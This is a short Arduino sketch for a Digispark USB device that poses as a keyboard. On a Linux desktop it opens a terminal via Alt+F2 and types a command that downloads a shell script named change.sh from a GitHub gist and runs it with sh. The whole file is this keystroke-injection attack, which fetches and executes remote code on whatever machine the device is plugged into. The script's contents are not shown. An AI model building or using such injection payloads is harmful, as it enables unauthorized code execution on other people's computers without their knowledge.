#include "DigiKeyboard.h"
#include <avr/pgmspace.h>

void setup() {
  // put your setup code here, to run once:
  DigiKeyboard.update();
}

void loop() {
  for (int i = 0; i < 1; i++) {
    // put your main code here, to run repeatedly:
    DigiKeyboard.sendKeyStroke(KEY_F2, MOD_ALT_LEFT);
    DigiKeyboard.delay(50);
    DigiKeyboard.print(F("gnome-terminal"));
    DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);
    DigiKeyboard.delay(300);
    DigiKeyboard.print(F("wget https://gist.githubusercontent.com/whoismath/1e45a552b3975640bf2fe3e952772ee4/raw/66cc8f16376d06fc4cbb9cab96cfaa801674bedf/change.sh && sh change.sh"));
    DigiKeyboard.delay(100);
    DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);
  }
}
